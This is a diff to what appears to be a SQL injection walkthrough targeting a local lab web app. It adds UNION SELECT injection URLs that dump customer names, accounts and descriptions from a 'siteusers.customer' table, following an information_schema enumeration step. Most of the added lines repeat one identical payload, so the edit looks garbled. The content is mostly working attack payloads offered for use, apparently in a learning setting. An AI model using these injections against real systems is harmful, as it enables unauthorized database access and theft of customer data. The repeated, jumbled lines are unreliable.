@@ -136,7 +136,19 @@ ________________________________________________________________________________
     http://127.0.0.1:20002/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
 ______________________________________________________________________________________________________________
 ## Once we get the output which will be the entire database we can now narrow the search
-### By doing this we can view any data inside we want based on the filters below
+### By doing this we can view any data inside we want based on the filters below 1,3,2
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,name FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT account,3,category FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT description,3,2 FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
     http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
 ______________________________________________________________________________________________________________
 ## 
